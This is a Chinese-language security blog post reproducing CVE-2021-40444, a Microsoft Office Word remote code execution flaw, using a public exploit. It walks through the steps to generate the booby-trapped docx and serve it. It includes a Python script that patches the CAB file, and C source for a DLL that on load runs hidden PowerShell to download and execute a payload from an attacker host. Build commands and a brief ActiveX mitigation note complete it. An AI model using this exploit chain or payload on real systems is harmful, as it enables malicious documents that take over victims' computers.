<!DOCTYPE html>
<html lang="zh-CN">










<head>
    <meta charset="utf-8" />
    <link rel="apple-touch-icon" sizes="76x76" href="/favicon.ico">
    <link rel="icon" type="image/png" href="/favicon.ico">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no" name="viewport" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="description" content="One way to choose one">
    <meta name="author" content="Misaki">
    <meta name="keywords" content="">
    <title>Office Word CVE-2021-40444  ~ Misaki&#39;s Blog</title>
    
<link rel="stylesheet" href="/css/Material_Icons.css">

    <!-- 
<link rel="stylesheet" href="/css/font-awesome.css">
 -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
    
<link rel="stylesheet" href="/css/main.css">

    
        
<link rel="stylesheet" href="/css/post.css">

        
            
<link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">

        
    
<meta name="generator" content="Hexo 5.2.0"></head>

<body class=" sidebar-collapse">
<nav class="navbar navbar-transparent navbar-color-on-scroll fixed-top navbar-expand-lg" color-on-scroll="100" id="sectionsNav">
    <div class="container">
        <div class="navbar-translate">
            <a class="navbar-brand" href="/">
                Misaki&#39;s Blog</a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" aria-expanded="false" aria-label="Toggle navigation">
                <span class="sr-only">Toggle navigation</span>
                <span class="navbar-toggler-icon"></span>
                <span class="navbar-toggler-icon"></span>
                <span class="navbar-toggler-icon"></span>
            </button>
        </div>
            <div class="collapse navbar-collapse">
                <ul class="navbar-nav ml-auto">
                    
                        
                            <li class="nav-item">
                                <a class="nav-link" href="/archives/">
                                    archives
                                </a>
                            </li>
                        
                            <li class="nav-item">
                                <a class="nav-link" href="/about/">
                                    about
                                </a>
                            </li>
                        
                    
                    
                        
                            <li class="nav-item">
                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://github.com/MisakiKata" target="_blank" data-original-title="See me here">
                                    <i class="fa fa-github"></i>
                                </a>
                            </li>
                        
                            <li class="nav-item">
                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://www.t00ls.net/members-profile-12179.html" target="_blank" data-original-title="See me here">
                                    <i class="fa fa-twitch"></i>
                                </a>
                            </li>
                        
                            <li class="nav-item">
                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://misakikata.github.io/atom.xml" target="_blank" data-original-title="See me here">
                                    <i class="fa fa-rss"></i>
                                </a>
                            </li>
                        
                            <li class="nav-item">
                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="mailto:misakikatas@gmail.com" target="_blank" data-original-title="See me here">
                                    <i class="fa fa-envelope"></i>
                                </a>
                            </li>
                        
                    
                </ul>
            </div>
    </div>
</nav>
    
  <div class="page-header header-filter" data-parallax="true" style="background-image: url('/img/post-banner.jpg'); height: 70vh;">
    
      <div class="container">
        <h1 class="title text-center post_title">Office Word CVE-2021-40444 </h1>
        <p class="text-center"><b>Wednesday, September 15th 2021, 4:55 pm</b></p>
      </div>
    
  </div>

  
  
  
    <div class="row" style="margin: 0 0 0; z-index: 999;">
  <div class="col-md-8 offset-md-1">
    <div class="main main-raised">
      <div class="container">
        <div class="section">
          <div class="post_content">
              <h3 id="CVE-2021-40444"><a href="#CVE-2021-40444" class="headerlink" title="CVE-2021-40444"></a>CVE-2021-40444</h3><p>Office Word的一个1day，首先来复现一下使用，如果直接运行会显示CAB file建立时出错，需要先安装lacb。这里使用Tools老哥的一个方法，直接安装：</p>
<pre class="line-numbers language-none"><code class="language-none">wget http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian&#x2F;pool&#x2F;main&#x2F;l&#x2F;lcab&#x2F;lcab_1.0b12.orig.tar.gz
tar zxvf lcab_1.0b12.orig.tar.gz
cd lcab-1.0b12
.&#x2F;configure
make
sudo make install
which lcab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>使用项目地址：<a target="_blank" rel="noopener" href="https://github.com/lockedbyte/CVE-2021-40444">https://github.com/lockedbyte/CVE-2021-40444</a></p>
<p>利用文档中给出的方法执行：</p>
<pre class="line-numbers language-none"><code class="language-none">python3 exploit.py generate test&#x2F;calc.dll http:&#x2F;&#x2F;192.168.111.130:5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210915103820898.png" alt="image-20210915103820898"></p>
<p>然后监听</p>
<pre class="line-numbers language-none"><code class="language-none">python3 exploit.py host 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210915103914999.png" alt="image-20210915103914999"></p>
<p>把在out文件夹下生成的document.docx拷贝到Windows下，此处的office2019，16.0.13929版本。运行docx文件，可以看到交互过程</p>
<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210915104537994.png" alt="image-20210915104537994"></p>
<p>于是就可以弹出计算器<br><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210915104258300.png" alt="image-20210915104258300"></p>
<p>从请求上看，有一个word.html文件，在srv目录下。打开查看,OK 看不懂。。。看样子是做了混淆？不过任然可以依稀看到ActiveXObject，这个大概跟利用ActiveX控件有关。</p>
<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210915105543173.png" alt="image-20210915105543173"></p>
<p>可以来<a target="_blank" rel="noopener" href="http://jsnice.org/">美化一下</a>，虽然依旧看不懂就是。不过从中间大概可以看到几个关键点，XMLHttpRequest发起的请求，地址为<a target="_blank" rel="noopener" href="http://192.168.111.130:5555/word.cab">http://192.168.111.130:5555/word.cab</a>。所以这个cab文件才是真正执行的文件？</p>
<p>利用7z打开这个cab文件，文件标头为<code>4D 53 43 46</code>，虽然这个文件只有224K，但是里面有一个名为msword.inf的文件，大小为1G左右。这不太对。这个文件也在上面的js中提到过，所以大概是需要解压出来，想办法提取一下这个文件。</p>
<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210915112956403.png" alt="image-20210915112956403"></p>
<p>该文件是Windows的压缩格式，一般是作为安装包文件。利用Kali下的<strong>cabextract</strong>来解压。没有的话直接安装就行。</p>
<pre class="line-numbers language-none"><code class="language-none">cabextract --list word.cab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>执行报错，这个文件不能正常解压提取，说明不是一个正经的cab文件。看一下python的处理代码</p>
<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210915112956403.png" alt="image-20210915120544407"></p>
<p>可以发现其实msword.inf就是word.dll。这个dll文件就是一开始传入的calc.dll重命名来的。后面用lcab来生成cab文件，然后用函数patch_cab来处理这个cab文件。这么我们先把这个处理前生成的cab文件保存一下。</p>
<pre class="line-numbers language-none"><code class="language-none">execute_cmd(&#39;lcab out.cab out2.cab&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>获取到out2.cab，这个文件可以正常解压查看，所以我们先尝试是否能自己生成一个cab文件，利用dll来转换。</p>
<p>用cobaltstrike生成一个DLL文件，按照转换方式来处理一下。先改个名字，此处用的beacon作为名字，那么word.html中也要做相应的修改。或者把名字改为msword。</p>
<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210915141049112.png" alt="image-20210915141049112"></p>
<p>然后需要patch一下，原项目中存在patch脚本，修改为类似如下：</p>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python3
​
# Patch cab file
​
m_off &#x3D; 0x2d
f &#x3D; open(&#39;.&#x2F;beacon.cab&#39;,&#39;rb&#39;)
cab_data &#x3D; f.read()
f.close()
​
out_cab_data &#x3D; cab_data[:m_off]
out_cab_data +&#x3D; b&#39;\x00\x5c\x41\x00&#39;
out_cab_data +&#x3D; cab_data[m_off+4:]
​
out_cab_data &#x3D; out_cab_data.replace(b&#39;..\\beacon.inf&#39;, b&#39;..&#x2F;beacon.inf&#39;)
​
f &#x3D; open(&#39;.&#x2F;beacon2.cab&#39;,&#39;wb&#39;)
f.write(out_cab_data)
f.close()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但是在执行过程中并没有上线，不确定原因，可能是DLL的问题？CS生成的DLL不能直接拿来用？</p>
<p>使用C代码编译生成一个DLL，利用如下代码，编译执行即可。</p>
<pre class="line-numbers language-none"><code class="language-none">#include &lt;windows.h&gt;
​
void exec(void) &#123;
system(&quot;powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;192.168.111.130:80&#x2F;a&#39;))\&quot;&quot;);
return;
&#125;
​
BOOL WINAPI DllMain(
   HINSTANCE hinstDLL,
   DWORD fdwReason,
   LPVOID lpReserved )
&#123;
   switch( fdwReason )
  &#123;
       case DLL_PROCESS_ATTACH:
          exec();
          break;
​
       case DLL_THREAD_ATTACH:
           break;
​
       case DLL_THREAD_DETACH:
           break;
​
       case DLL_PROCESS_DETACH:
           break;
  &#125;
   return TRUE;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>编译</p>
<pre class="line-numbers language-none"><code class="language-none">apt-get install gcc-mingw-w64
i686-w64-mingw32-gcc -shared beacon.c -o beacon.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>把文件放到test目录下，执行上面的命令。</p>
<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210915161830711.png" alt="image-20210915161830711"></p>
<p>减轻影响</p>
<p>这个是利用ActiveX控件来执行的，而这个控件只有IE支持，到IE的选项-安全中，自定义安全级别，在运行ActiveX控件和插件选项中选择禁用。</p>
<p>参考地址：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/lockedbyte/CVE-2021-40444">https://github.com/lockedbyte/CVE-2021-40444</a></p>
<p><a target="_blank" rel="noopener" href="https://www.t00ls.cc/thread-62682-1-1.html">https://www.t00ls.cc/thread-62682-1-1.html</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/hjjLKQCiaVUKWOw1jzQE9A">https://mp.weixin.qq.com/s/hjjLKQCiaVUKWOw1jzQE9A</a></p>

          </div>
          <br><br>
              
                <div class="license-wrapper">
                    <p>原文作者：<a href="https://misakikata.github.io">Misaki</a>
                    <p>原文链接：<a href="https://misakikata.github.io/2021/09/Office-Word-CVE-2021-40444/">https://misakikata.github.io/2021/09/Office-Word-CVE-2021-40444/</a>
                    <p>发表日期：<a href="https://misakikata.github.io/2021/09/Office-Word-CVE-2021-40444/">September 15th 2021, 4:55:33 pm</a>
                    <p>更新日期：<a href="https://misakikata.github.io/2021/09/Office-Word-CVE-2021-40444/">September 15th 2021, 4:55:33 pm</a>
                    <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
                </div>
              
          <br><br>
          <div>
              <p>
                       
                      <span class="badge badge-default">#&nbsp;web安全</span>
                      &nbsp;
                      
              </p>
          </div>
        </div>
      </div>  
    </div>
  </div>
  <!-- TOC -->
  
      <div class="">
        <div id="toc">
          <p class="toc-title"><i class="material-icons" style="vertical-align:middle">toc</i>Toc:</p> 
          <div id="tocbot"></div>
        </div>
      </div>
  
</div>


<!-- Comments -->
<div class="row">
    <div class="col-md-8 offset-md-2">
    
        
            <div class="disqus" style="width:100%">
    <div id="disqus_thread"></div>
    <script>               
        var disqus_shortname = '';
        var disqus_config = function () {
            this.page.url = 'https://misakikata.github.io/2021/09/Office-Word-CVE-2021-40444/'; 
            this.page.identifier = '/2021/09/Office-Word-CVE-2021-40444/';
        };
        (function() { 
            var d = document, s = d.createElement('script');
            s.type = 'text/javascript';
            s.src = '//'+disqus_shortname+'.disqus.com/embed.js';
            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
</div>
        
    
    </div>
</div>
  

<footer class="footer footer-default">
        <div class="container">
          <div class="float-left" style="padding: 15px 0;">
              <b>假如今天的你被生活辜负了，别伤心，因为明天生活还会继续辜负你！</b>
          </div>
          <div align="right" style="padding: 15px 0;">
              <i class="iconfont icon-love" ></i>
              <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
          </div>
        </div>
</footer>
      <!--   Core JS Files   -->
      
<script src="/js/core/jquery.min.js?v=3.2.1.js"></script>

      
<script src="/js/main.js"></script>

      
<script src="/js/core/popper.min.js"></script>

      
<script src="/js/core/bootstrap-material-design.min.js"></script>

      
<script src="/js/plugins/moment.min.js"></script>

      
<script src="/js/material-kit.min.js?v=2.0.5.js"></script>

      
        <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
        
<script src="/js/post.js"></script>

        
<script src="/js/plugins/prettify.js"></script>

        <script>
            $(document).ready(function(){
                $('pre').addClass('prettyprint linenums');
                prettyPrint();
            })
        </script>
      
<script src="/live2d-widget/autoload.js"></script>
</body>
</html>